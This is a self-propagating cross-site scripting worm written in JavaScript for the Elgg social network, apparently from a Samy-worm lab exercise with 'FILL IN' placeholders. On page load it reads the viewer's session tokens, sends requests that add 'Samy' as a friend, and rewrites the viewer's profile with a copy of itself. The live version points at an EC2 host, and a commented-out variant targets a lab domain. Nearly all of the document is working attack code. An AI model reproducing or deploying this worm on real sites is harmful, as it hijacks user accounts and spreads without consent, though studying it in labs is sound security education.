<script id="worm", type="text/javascript" >
	window.onload = function(){
		var userName=elgg.session.user.name;
		var guid="&guid="+elgg.session.user.guid;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		


		//worm code
		var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; //line 1
		var jsCode = document.getElementById("worm").innerHTML; //line 2
		var tailTag = "</" + "script>";  //line 3
		var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); //line 4
		alert(jsCode);		

		var desc= "&description=Samy is cool" + wormCode+ "&accesslevel[description]=2"

		//Construct the content of your url.
                var name = "&name="+userName;
		var content=token + ts +userName+desc+guid; //FILL IN
		var sendurl="http://ec2-54-209-221-243.compute-1.amazonaws.com/action/profile/edit"; //FILL IN
		var samyGuid=47; //FILL IN

		if(elgg.session.user.guid!=samyGuid){

			//add friend
			var Ajax=null;
			// var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
			// var token="&__elgg_token="+elgg.security.token.__elgg_token;
			//Construct the HTTP request to add Samy as a friend.
			var friendurl="http://ec2-54-209-221-243.compute-1.amazonaws.com/action/friends/add?friend=47" + ts + token; //FILL IN
			//Create and send Ajax request to add friend
			Ajax=new XMLHttpRequest();
			Ajax.open("GET",friendurl,true);
			Ajax.setRequestHeader("Host","ec2-54-209-221-243.compute-1.amazonaws.com");
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send();


			//Create and send Ajax request to modify profile
			//var Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","ec2-54-209-221-243.compute-1.amazonaws.com");
			Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}
</script>



// <script type="text/javascript" id="worm">
// 	window.onload = function(){
// 	var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
// 	var jsCode = document.getElementById("worm").innerHTML; 
// 	var tailTag = "</" + "script>"; 
// 	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
// 	var userName=elgg.session.user.name;
// 	var guid="&guid="+elgg.session.user.guid;
// 	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
// 	var token="&__elgg_token="+elgg.security.token.__elgg_token;
// 	var desc = "&description=Samy is my hero" + wormCode;desc +=  " &accesslevel[description]=2";
// 	var name="&name="+userNamevar sendurl="http://www.xsslabelgg.com/action/profile/edit";
// 	var content=token+ts+name+desc+guid;
// 	var samyGuid=47;
// 	if(elgg.session.user.guid!=samyGuid){
// 		var Ajax=null;
// 		Ajax=new XMLHttpRequest();Ajax.open("POST",sendurl,true);
// 		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
// 		Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
// 		Ajax.send(content);
// 	}
// }
// </script> -->